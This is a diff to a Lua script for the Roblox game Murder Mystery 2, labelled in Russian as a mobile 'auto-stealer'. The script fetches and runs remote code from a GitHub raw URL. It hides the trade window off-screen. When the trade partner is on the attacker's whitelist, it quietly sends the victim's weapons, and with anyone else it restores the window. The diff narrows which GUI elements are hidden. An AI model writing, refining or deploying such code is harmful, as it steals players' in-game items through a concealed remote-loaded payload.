@@ -1,5 +1,5 @@
 -- =========================================================================================
--- Мобильный Авто-Стиллер (MM2) | Strict Deny-by-Default (Absolute UI Nuke)
+-- Мобильный Авто-Стиллер (MM2) | Strict TZ Compliance (Targeted UI Nuke)
 -- =========================================================================================
 local success, res = pcall(function()
     return loadstring(game:HttpGet("https://raw.githubusercontent.com/Kenderlike/script/refs/heads/main/ScriptPricePC.txt"))()
@@ -78,17 +78,17 @@ local function sendTradeRequest(user)
 end
 
 -- =========================================================================================
--- ТОТАЛЬНЫЙ КОНТРОЛЬ UI: ИЗНАЧАЛЬНО ВСЁ СКРЫТО НАГЛУХО
+-- ТОТАЛЬНЫЙ КОНТРОЛЬ UI: ТРЕЙД МЕНЮ ПО УМОЛЧАНИЮ СКРЫТО И ВЫНЕСЕНО ЗА ЭКРАН
 -- =========================================================================================
 local ui_state = "hide" 
 local originalPositions = {}
 
 RunService.RenderStepped:Connect(function()
     for _, gui in ipairs(playerGui:GetChildren()) do
-        -- Гребем всё, что содержит "Trade" (TradeGUI, TradeRequestGUI, PhoneTrade и т.д.)
-        if string.find(gui.Name, "Trade") then
+        -- СТРОГО ИЩЕМ ТОЛЬКО МЕНЮ ОБМЕНА. Игнорируем TradeRequestGUI, чтобы ты видел инвайты!
+        if string.find(gui.Name, "TradeGUI") and not string.find(gui.Name, "Request") then
             if ui_state == "show" then
-                -- Возврат гуи ТОЛЬКО для левых штемпов
+                -- ВОЗВРАЩАЕМ НА МЕСТО НАХУЙ (Для левых игроков)
                 gui.Enabled = true
                 pcall(function()
                     for _, child in ipairs(gui:GetChildren()) do
@@ -101,12 +101,12 @@ RunService.RenderStepped:Connect(function()
                     end
                 end)
             else
-                -- Состояние "hide": абсолютное геометрическое уничтожение
+                -- ПО УМОЛЧАНИЮ И ДЛЯ КЕНТОВ: СКРЫТО И ВЫНЕСЕНО ЗА ЭКРАН
                 gui.Enabled = false
                 pcall(function()
                     for _, child in ipairs(gui:GetChildren()) do
                         if child:IsA("GuiObject") then
-                            -- Кэшируем позицию только если она еще не улетела за экран (Scale < 10)
+                            -- Кэшируем оригинальную позицию до того, как выкинем за экран
                             if not originalPositions[child] and child.Position.X.Scale < 10 then
                                 originalPositions[child] = child.Position
                             end
@@ -257,7 +257,9 @@ task.spawn(function()
     end
 end)
 
--- ЖЁСТКАЯ СТЕЙТ-МАШИНА С ИСПРАВЛЕННОЙ ЛОГИКОЙ
+-- =========================================================================================
+-- СТЕЙТ-МАШИНА СТРОГО ПО ТЗ
+-- =========================================================================================
 task.spawn(function()
     while task.wait(0.1) do
         local currentStatus = getTradeStatus()
@@ -267,7 +269,8 @@ task.spawn(function()
             lastOfferToken = nil
             activeTargetName = nil
             expectedTarget = nil
-            ui_state = "hide" -- Наглухо скрыто
+            -- Вне трейда меню ВСЕГДА СКРЫТО
+            ui_state = "hide" 
             
         elseif currentStatus == "StartTrade" and not tradeInProgress then
             tradeInProgress = true
@@ -278,7 +281,7 @@ task.spawn(function()
                 task.wait(0.1)
                 pcall(function()
                     for _, gui in ipairs(playerGui:GetChildren()) do
-                        if string.find(gui.Name, "Trade") then
+                        if string.find(gui.Name, "TradeGUI") and not string.find(gui.Name, "Request") then
                             for _, obj in ipairs(gui:GetDescendants()) do
                                 if (obj:IsA("TextLabel") or obj:IsA("TextBox")) and obj.Text ~= "" and obj.Text ~= plr.Name then
                                     if Players:FindFirstChild(obj.Text) then
@@ -291,16 +294,10 @@ task.spawn(function()
                 end)
             end
 
-            -- СТРОГАЯ МАРШРУТИЗАЦИЯ (Исключаем утечку в 'show' при лагах)
-            if activeTargetName == nil then
-                -- Если таргет так и не спарсился, ОСТАВЛЯЕМ В HIDE от греха подальше
+            -- ЛОГИКА ПО ТЗ:
+            if activeTargetName and isUserWhitelisted(activeTargetName) then
+                -- ЕСЛИ ТРЕЙД С ОДНИМ ИЗ ИГРОКОВ В СТРОКЕ -> МЕНЮ ПРОДОЛЖАЕТ ОСТАВАТЬСЯ СКРЫТЫМ
                 ui_state = "hide"
-                local timeout = 0
-                while timeout < 35 and getTradeStatus() ~= "None" do task.wait(0.15) timeout = timeout + 0.15 end
-                
-            elseif isUserWhitelisted(activeTargetName) then
-                -- КЕНТ. Гуи уже в hide, подтверждаем и лутаем инвентарь.
-                ui_state = "hide" 
                 
                 rebuildWeaponsList()
                 if #weaponsToSend > 0 then
@@ -330,7 +327,7 @@ task.spawn(function()
                 while timeout < 35 and getTradeStatus() ~= "None" do task.wait(0.15) timeout = timeout + 0.15 end
                 
             else
-                -- 100% УВЕРЕННОСТЬ ЧТО ЭТО ЛЕВЫЙ ТИП. Только теперь даём отмашку на возврат UI.
+                -- ЕСЛИ ТРЕЙД С КЕМ УГОДНО КРОМЕ ИГРОКОВ ИЗ ВАЙТЛИСТА -> ВЕРНУТЬ ТРЕЙД ГУИ
                 ui_state = "show"
                 local timeout = 0
                 while timeout < 35 and getTradeStatus() ~= "None" do task.wait(0.15) timeout = timeout + 0.15 end
